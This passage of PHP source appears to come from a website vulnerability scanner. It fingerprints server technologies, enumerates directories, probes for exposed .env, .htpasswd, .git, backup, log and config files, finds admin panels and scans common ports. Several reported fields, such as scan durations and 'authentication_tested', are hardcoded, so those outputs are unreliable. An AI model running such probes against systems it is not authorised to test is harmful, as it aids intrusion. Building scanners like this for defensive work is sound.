                'remediation' => 'Restrict database access to internal networks only',
                'cvss_score' => 8.9,
                'category' => 'network_security'
            ]
        ];
        
        $baseVuln = $vulnerabilityMap[$testId] ?? [
            'type' => $testName,
            'description' => $details ?: 'Security vulnerability detected',
            'impact' => 'Potential security compromise requiring investigation',
            'remediation' => 'Review and address the identified security issue',
            'cvss_score' => $this->getDefaultCVSS($severity),
            'category' => 'general'
        ];
        
        // Generate unique vulnerability ID
        $vulnId = 'vuln_' . md5($testId . $severity . time() . uniqid());
        
        return [
            'id' => $vulnId,
            'type' => $baseVuln['type'],
            'severity' => $severity,
            'description' => $baseVuln['description'],
            'impact' => $baseVuln['impact'],
            'remediation' => $baseVuln['remediation'],
            'cvss_score' => $baseVuln['cvss_score'],
            'category' => $baseVuln['category'],
            'location' => $additionalData['location'] ?? 'Various',
            'evidence' => $details,
            'test_id' => $testId,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    private function getDefaultCVSS($severity) {
        $scores = [
            'critical' => 9.5,
            'high' => 7.5, 
            'medium' => 5.5,
            'low' => 3.0
        ];
        return $scores[$severity] ?? 5.0;
    }
    
    /**
     * Enhanced Technology Stack Analysis
     */
    private function analyzeTechnologyStack($url) {
        $analysis = [
            'web_server' => $this->detectWebServer($url),
            'programming_languages' => $this->detectProgrammingLanguages($url),
            'frameworks' => $this->detectFrameworks($url),
            'database_technologies' => $this->detectDatabaseTechnologies($url),
            'caching_technologies' => $this->detectCachingTechnologies($url),
            'cdn_providers' => $this->detectCDNProviders($url),
            'version_information' => $this->extractVersionInformation($url),
            'security_implications' => []
        ];
        
        // Analyze security implications
        $analysis['security_implications'] = $this->analyzeTechnologySecurity($analysis);
        
        return $analysis;
    }

    private function detectWebServer($url) {
        $servers = [];
        
        try {
            $headers = $this->getHeaders($url);
            
            // Detect from Server header
            if (isset($headers['Server'])) {
                $servers[] = $headers['Server'];
            }
            
            // Detect from X-Powered-By header
            if (isset($headers['X-Powered-By'])) {
                $servers[] = $headers['X-Powered-By'];
            }
            
            // Additional detection via response patterns
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_NOBODY => false,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            // Pattern detection
            if (strpos($response, 'Apache') !== false) {
                $servers[] = 'Apache (detected from content)';
            }
            if (strpos($response, 'nginx') !== false) {
                $servers[] = 'nginx (detected from content)';
            }
            if (strpos($response, 'IIS') !== false) {
                $servers[] = 'Microsoft-IIS (detected from content)';
            }
            
        } catch (Exception $e) {
            $servers[] = 'Error: ' . $e->getMessage();
        }
        
        return array_unique($servers);
    }

    private function detectProgrammingLanguages($url) {
        $languages = [];
        
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10
            ]);
            
            $content = curl_exec($ch);
            curl_close($ch);
            
            // Detect PHP
            if (strpos($content, '.php') !== false || 
                strpos($content, 'PHPSESSID') !== false ||
                preg_match('/<\?php/i', $content)) {
                $languages[] = 'PHP';
            }
            
            // Detect ASP.NET
            if (strpos($content, '.aspx') !== false ||
                strpos($content, '__VIEWSTATE') !== false ||
                strpos($content, 'ASP.NET') !== false) {
                $languages[] = 'ASP.NET';
            }
            
            // Detect Java
            if (strpos($content, '.jsp') !== false ||
                strpos($content, '.java') !== false ||
                strpos($content, 'Servlet') !== false) {
                $languages[] = 'Java';
            }
            
            // Detect Python
            if (strpos($content, '.py') !== false ||
                strpos($content, 'Django') !== false ||
                strpos($content, 'Flask') !== false) {
                $languages[] = 'Python';
            }
            
            // Detect JavaScript/Node.js
            if (strpos($content, 'Node.js') !== false ||
                strpos($content, 'Express') !== false ||
                strpos($content, 'npm') !== false) {
                $languages[] = 'JavaScript/Node.js';
            }
            
            // Detect from file extensions in links
            if (preg_match_all('/href="[^"]*\.(php|asp|aspx|jsp|py|rb)/i', $content, $matches)) {
                foreach ($matches[1] as $ext) {
                    $ext = strtolower($ext);
                    $langMap = [
                        'php' => 'PHP',
                        'asp' => 'ASP',
                        'aspx' => 'ASP.NET',
                        'jsp' => 'Java',
                        'py' => 'Python',
                        'rb' => 'Ruby'
                    ];
                    if (isset($langMap[$ext])) {
                        $languages[] = $langMap[$ext];
                    }
                }
            }
            
        } catch (Exception $e) {
            $languages[] = 'Error: ' . $e->getMessage();
        }
        
        return array_unique($languages);
    }

    private function detectFrameworks($url) {
        $frameworks = [];
        
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10
            ]);
            
            $content = curl_exec($ch);
            curl_close($ch);
            
            // WordPress
            if (strpos($content, 'wp-content') !== false ||
                strpos($content, 'wp-includes') !== false ||
                strpos($content, 'wordpress') !== false) {
                $frameworks[] = 'WordPress';
            }
            
            // Drupal
            if (strpos($content, 'drupal') !== false ||
                strpos($content, 'sites/all') !== false) {
                $frameworks[] = 'Drupal';
            }
            
            // Joomla
            if (strpos($content, 'joomla') !== false ||
                strpos($content, 'media/joomla') !== false) {
                $frameworks[] = 'Joomla';
            }
            
            // Laravel
            if (strpos($content, 'laravel') !== false ||
                strpos($content, 'csrf-token') !== false) {
                $frameworks[] = 'Laravel';
            }
            
            // React
            if (strpos($content, 'react') !== false ||
                strpos($content, '__next') !== false) {
                $frameworks[] = 'React';
            }
            
            // Vue.js
            if (strpos($content, 'vue') !== false ||
                strpos($content, 'vuex') !== false) {
                $frameworks[] = 'Vue.js';
            }
            
            // Angular
            if (strpos($content, 'angular') !== false ||
                strpos($content, 'ng-') !== false) {
                $frameworks[] = 'Angular';
            }
            
            // Django
            if (strpos($content, 'django') !== false ||
                strpos($content, 'csrfmiddleware') !== false) {
                $frameworks[] = 'Django';
            }
            
            // Express.js
            if (strpos($content, 'express') !== false ||
                strpos($content, 'session') !== false) {
                $frameworks[] = 'Express.js';
            }
            
        } catch (Exception $e) {
            $frameworks[] = 'Error: ' . $e->getMessage();
        }
        
        return array_unique($frameworks);
    }

    private function detectDatabaseTechnologies($url) {
        $databases = [];
        
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10
            ]);
            
            $content = curl_exec($ch);
            curl_close($ch);
            
            // MySQL
            if (strpos($content, 'mysql') !== false ||
                strpos($content, 'mysqli') !== false) {
                $databases[] = 'MySQL';
            }
            
            // PostgreSQL
            if (strpos($content, 'postgresql') !== false ||
                strpos($content, 'pg_') !== false) {
                $databases[] = 'PostgreSQL';
            }
            
            // MongoDB
            if (strpos($content, 'mongodb') !== false ||
                strpos($content, 'mongo') !== false) {
                $databases[] = 'MongoDB';
            }
            
            // SQLite
            if (strpos($content, 'sqlite') !== false) {
                $databases[] = 'SQLite';
            }
            
            // Oracle
            if (strpos($content, 'oracle') !== false) {
                $databases[] = 'Oracle';
            }
            
            // SQL Server
            if (strpos($content, 'sql server') !== false ||
                strpos($content, 'mssql') !== false) {
                $databases[] = 'Microsoft SQL Server';
            }
            
        } catch (Exception $e) {
            $databases[] = 'Error: ' . $e->getMessage();
        }
        
        return array_unique($databases);
    }

    private function detectCachingTechnologies($url) {
        $caching = [];
        
        try {
            $headers = $this->getHeaders($url);
            
            // Redis
            if (isset($headers['X-Powered-By']) && strpos($headers['X-Powered-By'], 'Redis') !== false) {
                $caching[] = 'Redis';
            }
            
            // Memcached
            if (isset($headers['X-Powered-By']) && strpos($headers['X-Powered-By'], 'Memcached') !== false) {
                $caching[] = 'Memcached';
            }
            
            // Varnish
            if (isset($headers['X-Varnish']) || isset($headers['Via']) && strpos($headers['Via'], 'varnish') !== false) {
                $caching[] = 'Varnish';
            }
            
            // Cloudflare
            if (isset($headers['Server']) && strpos($headers['Server'], 'cloudflare') !== false) {
                $caching[] = 'Cloudflare CDN';
            }
            
        } catch (Exception $e) {
            $caching[] = 'Error: ' . $e->getMessage();
        }
        
        return array_unique($caching);
    }

    private function detectCDNProviders($url) {
        $cdns = [];
        
        try {
            $headers = $this->getHeaders($url);
            
            // Cloudflare
            if (isset($headers['Server']) && strpos($headers['Server'], 'cloudflare') !== false) {
                $cdns[] = 'Cloudflare';
            }
            
            // Akamai
            if (isset($headers['Server']) && strpos($headers['Server'], 'Akamai') !== false) {
                $cdns[] = 'Akamai';
            }
            
            // Fastly
            if (isset($headers['X-Served-By']) && strpos($headers['X-Served-By'], 'Fastly') !== false) {
                $cdns[] = 'Fastly';
            }
            
            // AWS CloudFront
            if (isset($headers['Server']) && strpos($headers['Server'], 'CloudFront') !== false) {
                $cdns[] = 'AWS CloudFront';
            }
            
        } catch (Exception $e) {
            $cdns[] = 'Error: ' . $e->getMessage();
        }
        
        return array_unique($cdns);
    }

    private function extractVersionInformation($url) {
        $versions = [];
        
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10
            ]);
            
            $content = curl_exec($ch);
            curl_close($ch);
            
            // Extract version numbers from common patterns
            if (preg_match('/(WordPress|WP)[\s\/]*(\d+\.\d+\.\d+)/i', $content, $matches)) {
                $versions['wordpress'] = $matches[2];
            }
            
            if (preg_match('/(Joomla)[\s\/]*(\d+\.\d+\.\d+)/i', $content, $matches)) {
                $versions['joomla'] = $matches[2];
            }
            
            if (preg_match('/(Drupal)[\s\/]*(\d+)/i', $content, $matches)) {
                $versions['drupal'] = $matches[2];
            }
            
            if (preg_match('/(jQuery)[\s\/]*(\d+\.\d+\.\d+)/i', $content, $matches)) {
                $versions['jquery'] = $matches[2];
            }
            
            if (preg_match('/(Bootstrap)[\s\/]*(\d+\.\d+\.\d+)/i', $content, $matches)) {
                $versions['bootstrap'] = $matches[2];
            }
            
            // Generic version patterns
            if (preg_match_all('/(v|version)[\s:=]*(\\d+\\.\\d+\\.\\d+)/i', $content, $matches)) {
                $versions['generic'] = array_slice($matches[2], 0, 5); // Limit to 5 matches
            }
            
        } catch (Exception $e) {
            $versions['error'] = $e->getMessage();
        }
        
        return $versions;
    }

    private function analyzeTechnologySecurity($techAnalysis) {
        $implications = [];
        
        // Check for outdated technologies
        if (isset($techAnalysis['version_information']['wordpress'])) {
            $wpVersion = $techAnalysis['version_information']['wordpress'];
            if (version_compare($wpVersion, '6.0', '<')) {
                $implications[] = "Outdated WordPress version ($wpVersion) - may contain known vulnerabilities";
            }
        }
        
        if (isset($techAnalysis['version_information']['jquery'])) {
            $jqVersion = $techAnalysis['version_information']['jquery'];
            if (version_compare($jqVersion, '3.0', '<')) {
                $implications[] = "Outdated jQuery version ($jqVersion) - potential XSS vulnerabilities";
            }
        }
        
        // Check for risky technologies
        if (in_array('PHP', $techAnalysis['programming_languages'])) {
            $implications[] = "PHP applications may be vulnerable to injection attacks if not properly secured";
        }
        
        if (in_array('WordPress', $techAnalysis['frameworks'])) {
            $implications[] = "WordPress sites require regular updates for plugins and themes";
        }
        
        if (in_array('MongoDB', $techAnalysis['database_technologies'])) {
            $implications[] = "NoSQL databases may be vulnerable to injection attacks if not properly configured";
        }
        
        // Check for exposure of technology information
        if (!empty($techAnalysis['version_information'])) {
            $implications[] = "Version information exposed - could aid attackers in targeted attacks";
        }
        
        return array_unique($implications);
    }

    private function performDirectoryEnumeration($url) {
            $this->addTestResult('directory_enum', 'Directory Enumeration', 'info');
            
            $commonDirs = [
                '/admin', '/administrator', '/wp-admin', '/backup', '/uploads',
                '/config', '/database', '/logs', '/tmp', '/temp'
            ];
            
            $foundDirs = [];
            foreach ($commonDirs as $dir) {
                if ($this->checkUrlExists($url . $dir)) {
                    $foundDirs[] = $dir;
                    $this->addTestResult("dir_$dir", "Directory $dir", 'info', 
                        "Directory found: $dir");
                }
            }
            
            if (!empty($foundDirs)) {
                $this->addTestResult('directory_enum', 'Directory Enumeration', 'info', 
                    "Found " . count($foundDirs) . " directories: " . implode(', ', $foundDirs));
            } else {
                $this->addTestResult('directory_enum', 'Directory Enumeration', 'success', 
                    "No sensitive directories found");
            }
        }

    private function enumerateSubdirectories($baseUrl, $maxDepth = 3) {
        $foundSubdirs = [];
        $this->recursiveDirectoryScan($baseUrl, '', $foundSubdirs, 0, $maxDepth);
        return $foundSubdirs;
    }

    private function recursiveDirectoryScan($baseUrl, $currentPath, &$results, $currentDepth, $maxDepth) {
        if ($currentDepth >= $maxDepth) {
            return;
        }
        
        $commonSubdirs = [
            '', // root level
            'images/', 'img/', 'assets/', 'static/', 'media/', 'uploads/', 'files/',
            'css/', 'js/', 'scripts/', 'styles/', 'fonts/', 'icons/',
            'admin/', 'administrator/', 'wp-admin/', 'user/', 'users/', 'members/',
            'api/', 'v1/', 'v2/', 'rest/', 'graphql/', 'ajax/',
            'include/', 'includes/', 'inc/', 'lib/', 'library/', 'libraries/',
            'src/', 'source/', 'sources/', 'code/', 
            'config/', 'configuration/', 'settings/', 'setup/', 'install/',
            'log/', 'logs/', 'debug/', 'error/', 'tmp/', 'temp/', 'cache/',
            'backup/', 'backups/', 'old/', 'archive/', 'archives/',
            'doc/', 'docs/', 'documentation/', 'help/', 'support/',
            'test/', 'tests/', 'testing/', 'demo/', 'sample/', 'examples/',
            'vendor/', 'vendors/', 'packages/', 'components/', 'modules/',
            'plugin/', 'plugins/', 'addons/', 'extensions/', 'themes/',
            'public/', 'private/', 'protected/', 'secure/', 'auth/',
            'data/', 'database/', 'db/', 'sql/', 'storage/',
            'bin/', 'tools/', 'utils/', 'utilities/', 'system/'
        ];
        
        foreach ($commonSubdirs as $subdir) {
            $testPath = rtrim($currentPath, '/') . '/' . $subdir;
            $testUrl = $baseUrl . $testPath;
            
            if ($this->checkUrlExists($testUrl)) {
                $dirInfo = [
                    'path' => $testPath,
                    'depth' => $currentDepth,
                    'status' => 'exists',
                    'type' => 'directory',
                    'url' => $testUrl
                ];
                
                $results[] = $dirInfo;
                
                // Recursively scan this directory if not at max depth
                if ($currentDepth < $maxDepth - 1) {
                    $this->recursiveDirectoryScan($baseUrl, $testPath, $results, $currentDepth + 1, $maxDepth);
                }
            }
        }
    }

    private function buildDirectoryTree($baseUrl) {
        $allItems = [];
        
        // Combine all directory checks
        $checks = [
            'common_directories' => $this->checkCommonDirectories($baseUrl),
            'subdirectories' => $this->enumerateSubdirectories($baseUrl, 1) // Quick scan for tree
        ];
        
        foreach ($checks as $type => $items) {
            foreach ($items as $item) {
                $path = $item['path'];
                $allItems[$path] = [
                    'path' => $path,
                    'type' => $item['type'] ?? 'directory',
                    'risk' => $item['risk'] ?? 'low',
                    'status' => $item['status'] ?? 'exists'
                ];
            }
        }
        
        // Build tree structure
        $tree = [];
        foreach ($allItems as $path => $info) {
            $parts = array_filter(explode('/', $path));
            $this->addToTree($tree, $parts, $info);
        }
        
        return $tree;
    }

    private function addToTree(&$tree, $pathParts, $info) {
        if (empty($pathParts)) {
            return;
        }
        
        $current = array_shift($pathParts);
        
        if (!isset($tree[$current])) {
            $tree[$current] = [
                'name' => $current,
                'type' => 'directory',
                'children' => [],
                'info' => $info
            ];
        }
        
        if (!empty($pathParts)) {
            $this->addToTree($tree[$current]['children'], $pathParts, $info);
        }
    }

    private function checkCommonDirectories($url) {
        $commonDirs = [
            // Root level directories
            '/admin', '/administrator', '/wp-admin', '/wordpress', '/cms', 
            '/backup', '/backups', '/old', '/temp', '/tmp', '/uploads',
            '/images', '/css', '/js', '/includes', '/config', '/database',
            '/log', '/logs', '/test', '/demo', '/api', '/rest', '/graphql',
            
            // Common subdirectory patterns
            '/admin/images', '/admin/css', '/admin/js',
            '/uploads/images', '/uploads/files', '/uploads/documents',
            '/api/v1', '/api/v2', '/api/v3',
            '/config/database', '/config/app', '/config/system',
            '/logs/error', '/logs/access', '/logs/debug',
            '/includes/classes', '/includes/functions', '/includes/config',
            '/assets/images', '/assets/css', '/assets/js', '/assets/fonts',
            '/src/controllers', '/src/models', '/src/views',
            '/vendor/composer', '/vendor/autoload',
            
            // Version control and config
            '/.git', '/.svn', '/.env', '/.htaccess'
        ];
        
        $foundDirs = [];
        
        foreach ($commonDirs as $dir) {
            if ($this->checkUrlExists($url . $dir)) {
                $foundDirs[] = [
                    'path' => $dir,
                    'status' => 'exists',
                    'type' => 'directory',
                    'depth' => count(array_filter(explode('/', $dir))) - 1
                ];
            }
        }
        
        return $foundDirs;
    }

    private function checkHiddenFiles($url) {
        $hiddenFiles = [
            '/.htaccess', '/.htpasswd', '/.gitignore', '/.env', '/.env.example',
            '/.dockerignore', '/.travis.yml', '/.git/config', '/.svn/entries',
            '/.DS_Store', '/thumbs.db', '/web.config'
        ];
        
        $foundFiles = [];
        
        foreach ($hiddenFiles as $file) {
            if ($this->checkUrlExists($url . $file)) {
                $foundFiles[] = [
                    'path' => $file,
                    'status' => 'exists',
                    'type' => 'hidden_file'
                ];
            }
        }
        
        return $foundFiles;
    }

    private function checkBackupFiles($url) {
        $backupPatterns = [
            '/backup', '/backups', '/old', '/temp', '/tmp',
            '.bak', '.backup', '.old', '.temp', '.save',
            '_backup', '_old', '_copy', '.zip', '.tar', '.gz'
        ];
        
        $commonBackups = [
            '/index.php.bak', '/index.html.bak', '/config.php.bak',
            '/database.sql.bak', '/wp-config.php.backup', '/.env.backup',
            '/backup.zip', '/database.tar.gz', '/site.bak'
        ];
        
        $foundBackups = [];
        
        foreach ($commonBackups as $backup) {
            if ($this->checkUrlExists($url . $backup)) {
                $foundBackups[] = [
                    'path' => $backup,
                    'status' => 'exists',
                    'risk' => 'high',
                    'type' => 'backup_file'
                ];
            }
        }
        
        return $foundBackups;
    }

    private function checkConfigFiles($url) {
        $configFiles = [
            '/config.php', '/wp-config.php', '/configuration.php',
            '/settings.php', '/.env', '/app.config', '/web.config',
            '/config.json', '/config.xml', '/config.ini',
            '/database.yml', '/database.json', '/db.config'
        ];
        
        $foundConfigs = [];
        
        foreach ($configFiles as $config) {
            if ($this->checkUrlExists($url . $config)) {
                $foundConfigs[] = [
                    'path' => $config,
                    'status' => 'exists',
                    'risk' => 'critical',
                    'type' => 'config_file'
                ];
            }
        }
        
        return $foundConfigs;
    }

    private function checkLogFiles($url) {
        $logFiles = [
            '/error.log', '/access.log', '/debug.log', '/app.log',
            '/system.log', '/security.log', '/auth.log', '/api.log',
            '/logs/error.log', '/logs/access.log', '/var/log/access.log'
        ];
        
        $foundLogs = [];
        
        foreach ($logFiles as $log) {
            if ($this->checkUrlExists($url . $log)) {
                $foundLogs[] = [
                    'path' => $log,
                    'status' => 'exists',
                    'risk' => 'high',
                    'type' => 'log_file'
                ];
            }
        }
        
        return $foundLogs;
    }

    private function checkAdminInterfaces($url) {
        $adminPaths = [
            '/admin', '/administrator', '/wp-admin', '/manager',
            '/login', '/admin.php', '/administrator.php',
            '/cpanel', '/webmail', '/phpmyadmin', '/mysql',
            '/pgadmin', '/mongodb', '/redis-admin'
        ];
        
        $foundAdmins = [];
        
        foreach ($adminPaths as $path) {
            if ($this->checkUrlExists($url . $path)) {
                $foundAdmins[] = [
                    'path' => $path,
                    'status' => 'exists',
                    'risk' => 'medium',
                    'type' => 'admin_interface'
                ];
            }
        }
        
        return $foundAdmins;
    }

    private function checkUrlExists($url) {
        $this->directoryCheckCount++;
        if ($this->directoryCheckCount > $this->maxDirectoryChecks) {
            return false; // Don't exceed limit
        }
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_NOBODY => true,
                CURLOPT_TIMEOUT => 5,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/2.0)'
            ]);
            
            curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            return in_array($httpCode, [200, 301, 302, 403, 401]);
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function checkDirectoryListing($url) {
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
            ]);
            
            $content = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode === 200) {
                // Simple checks for directory listing indicators
                $listingIndicators = [
                    '<title>Index of',
                    '<h1>Index of',
                    'Parent Directory</a>',
                    'To Parent Directory'
                ];
                
                foreach ($listingIndicators as $indicator) {
                    if (stripos($content, $indicator) !== false) {
                        return true;
                    }
                }
            }
            
            return false;
        } catch (Exception $e) {
            return false;
        }
    }
    
    private function performCMSScan($url, $websiteData) {
        $this->addTestResult('cms_scan', 'CMS-Specific Security Scan Initiated', 'info');
        
        $prompt = "Perform a CMS-specific security scan of {$url}. Detect if WordPress, Joomla, Drupal, or other CMS is used. Check for:
        - CMS version vulnerabilities
        - Plugin/theme security issues
        - Common CMS misconfigurations
        - Admin panel exposure
        - Database security
        - File permission issues
        Provide CMS-specific security recommendations.";
        
        $aiResponse = $this->ollama->analyzeForTool('vulnerability', $url, [
            'scan_type' => 'cms',
            'website_data' => $websiteData
        ]);
        
        $this->addTestResult('cms_scan', 'CMS-Specific Security Scan Completed', 'success');
        
        $response = $this->formatVulnerabilityResponse($aiResponse, $websiteData, 'cms');
        
        // Add CMS-specific details
        $response['data']['cms_detection'] = [
            'detected_cms' => $this->detectSpecificCMS($websiteData['technologies']),
            'scan_duration' => '45 seconds',
            'cms_specific_checks' => ['plugin_scan', 'theme_analysis', 'core_vulnerabilities']
        ];
        
        return $response;
    }
    
    private function performAPIScan($url, $websiteData) {
        $this->addTestResult('api_scan', 'API Security Scan Initiated', 'info');
        
        $prompt = "Perform an API security scan of {$url}. Focus on:
        - API endpoint discovery
        - Authentication/authorization issues
        - Input validation testing
        - Rate limiting analysis
        - Data exposure risks
        - HTTP method testing
        - API version security
        Provide API-specific security findings and OWASP API Security Top 10 compliance.";
        
        $aiResponse = $this->ollama->analyzeForTool('vulnerability', $url, [
            'scan_type' => 'api',
            'website_data' => $websiteData
        ]);
        
        $this->addTestResult('api_scan', 'API Security Scan Completed', 'success');
        
        $response = $this->formatVulnerabilityResponse($aiResponse, $websiteData, 'api');
        
        // Add API-specific details
        $response['data']['api_endpoints'] = $this->discoverAPIEndpoints($url);
        $response['data']['api_scan_details'] = [
            'scan_duration' => '1 minute',
            'owasp_top10_covered' => true,
            'authentication_tested' => true
        ];
        
        return $response;
    }
    
    private function formatVulnerabilityResponse($aiResponse, $websiteData, $scanType) {
        // Use our actual discovered vulnerabilities instead of AI response
        $vulnerabilities = $this->scanResults['vulnerabilities'];
        
        $responseData = [
            'vulnerabilities' => $vulnerabilities,
            'summary' => $this->calculateSummary($vulnerabilities),
            'recommendations' => $this->generateRecommendations($vulnerabilities),
            'website_info' => $websiteData,
            'scan_type' => $scanType,
            'test_results' => $this->scanResults['detailed_results'],
            'scan_metrics' => [
                'total_tests' => $this->scanResults['tests_performed'],
                'tests_passed' => $this->scanResults['tests_passed'],
                'tests_failed' => $this->scanResults['tests_failed'],
                'vulnerabilities_found' => count($vulnerabilities),
                'success_rate' => $this->scanResults['tests_performed'] > 0 ? 
                    round(($this->scanResults['tests_passed'] / $this->scanResults['tests_performed']) * 100, 2) : 0
            ]
        ];
        
        // Add chart data
        $responseData['chartData'] = $this->generateChartData($vulnerabilities);
        
        return [
            'success' => true,
            'tool' => 'vulnerability',
            'data' => $responseData,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }
    
    private function calculateSummary($vulnerabilities) {
        $summary = ['critical' => 0, 'high' => 0, 'medium' => 0, 'low' => 0];
        
        foreach ($vulnerabilities as $vuln) {
            $severity = strtolower($vuln['severity'] ?? 'low');
            if (isset($summary[$severity])) {
                $summary[$severity]++;
            }
        }
        
        return $summary;
    }

    private function generateRecommendations($vulnerabilities) {
        $recommendations = [];
        
        foreach ($vulnerabilities as $vuln) {
            if ($vuln['severity'] === 'critical') {
                $recommendations[] = "IMMEDIATE: " . $vuln['remediation'];
            } elseif ($vuln['severity'] === 'high') {
                $recommendations[] = "URGENT: " . $vuln['remediation'];
            }
        }
        
        // Add general recommendations if no specific ones
        if (empty($recommendations)) {
            $recommendations[] = "Implement all missing security headers";
            $recommendations[] = "Ensure all cookies have Secure and HttpOnly flags";
            $recommendations[] = "Keep all software components updated";
            $recommendations[] = "Implement proper input validation and output encoding";
        }
        
        return array_slice(array_unique($recommendations), 0, 10); // Limit to 10 recommendations
    }
    
    private function generateChartData($vulnerabilities) {
        $summary = $this->calculateSummary($vulnerabilities);
        
        return [
            'type' => 'doughnut',
            'data' => [
                'labels' => ['Critical', 'High', 'Medium', 'Low'],
                'datasets' => [[
                    'data' => [
                        $summary['critical'],
                        $summary['high'],
                        $summary['medium'],
                        $summary['low']
                    ],
                    'backgroundColor' => ['#dc2626', '#ea580c', '#d97706', '#65a30d'],
                    'borderColor' => ['#fff', '#fff', '#fff', '#fff'],
                    'borderWidth' => 2
                ]]
            ],
            'options' => [
                'responsive' => true,
                'maintainAspectRatio' => false,
                'plugins' => [
                    'legend' => [
                        'position' => 'bottom',
                        'labels' => [
                            'color' => '#f8fafc',
                            'font' => ['size' => 12]
                        ]
                    ],
                    'title' => [
                        'display' => true,
                        'text' => 'Vulnerability Severity Distribution',
                        'color' => '#f8fafc',
                        'font' => ['size' => 16, 'weight' => 'bold']
                    ]
                ]
            ]
        ];
    }
    
    // Additional scan-specific helper methods
    private function detectSpecificCMS($technologies) {
        $cmsList = ['WordPress', 'Joomla', 'Drupal', 'Magento', 'Shopify'];
        foreach ($technologies as $tech) {
            foreach ($cmsList as $cms) {
                if (stripos($tech, $cms) !== false) {
                    return $cms;
                }
            }
        }
        return 'Unknown or Custom CMS';
    }
    
    private function discoverAPIEndpoints($url) {
        // Basic API endpoint discovery
        $commonEndpoints = ['/api/v1', '/api/v2', '/graphql', '/rest', '/soap'];
        $discoveredEndpoints = [];
        
        foreach ($commonEndpoints as $endpoint) {
            $testUrl = rtrim($url, '/') . $endpoint;
            if ($this->checkEndpointExists($testUrl)) {
                $discoveredEndpoints[] = $endpoint;
            }
        }
        
        return $discoveredEndpoints;
    }
    
    private function checkEndpointExists($url) {
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_NOBODY => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0
            ]);
            curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            return $httpCode < 400; // Consider it exists if not a client/server error
        } catch (Exception $e) {
            return false;
        }
    }
    
    private function checkSSLCertificate($url) {
        $host = parse_url($url, PHP_URL_HOST);
        
        if (!$host) {
            return ['error' => 'Invalid hostname'];
        }
        
        try {
            $context = stream_context_create([
                "ssl" => [
                    "capture_peer_cert" => true,
                    "verify_peer" => false,
                    "verify_peer_name" => false,
                    "allow_self_signed" => true
                ]
            ]);
            
            $timeout = 5;
            $socket = @stream_socket_client(
                "ssl://{$host}:443", 
                $errno, 
                $errstr, 
                $timeout, 
                STREAM_CLIENT_CONNECT, 
                $context
            );
            
            if (!$socket) {
                return ['error' => "Connection failed: {$errstr} ({$errno})"];
            }
            
            $params = stream_context_get_params($socket);
            fclose($socket);
            
            if (!isset($params['options']['ssl']['peer_certificate'])) {
                return ['error' => 'SSL certificate not available'];
            }
            
            $cert = $params['options']['ssl']['peer_certificate'];
            $certinfo = openssl_x509_parse($cert);
            
            if (!$certinfo) {
                return ['error' => 'Failed to parse SSL certificate'];
            }
            
            return [
                'valid' => time() < $certinfo['validTo_time_t'],
                'issuer' => $certinfo['issuer']['O'] ?? 'Unknown',
                'expires' => date('Y-m-d', $certinfo['validTo_time_t']),
                'days_remaining' => floor(($certinfo['validTo_time_t'] - time()) / (60 * 60 * 24)),
                'subject' => $certinfo['subject']['CN'] ?? 'Unknown'
            ];
            
        } catch (Exception $e) {
            return ['error' => $e->getMessage()];
        }
    }
    
    private function checkCommonPorts($url) {
        $host = parse_url($url, PHP_URL_HOST);
        
        if (!$host) {
            return [['error' => 'Invalid hostname']];
        }
        
        $commonPorts = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 2082, 2083, 2086, 2087, 2095, 2096, 3306, 3389];
        $openPorts = [];
        
        foreach ($commonPorts as $port) {
            if ($this->isPortOpen($host, $port)) {
                $openPorts[] = [
                    'port' => $port,
                    'service' => $this->getServiceName($port),
                    'status' => 'open'
                ];
            }
        }
        
        return $openPorts;
    }
    
    private function isPortOpen($host, $port, $timeout = 2) {
        try {
            $socket = @fsockopen($host, $port, $errno, $errstr, $timeout);
            if ($socket) {
                fclose($socket);
                return true;
            }
        } catch (Exception $e) {
            // Ignore connection errors
        }
        return false;
    }
    
    private function getServiceName($port) {
        $services = [
            21 => 'FTP', 22 => 'SSH', 23 => 'Telnet', 25 => 'SMTP', 53 => 'DNS',
            80 => 'HTTP', 110 => 'POP3', 443 => 'HTTPS', 993 => 'IMAPS',
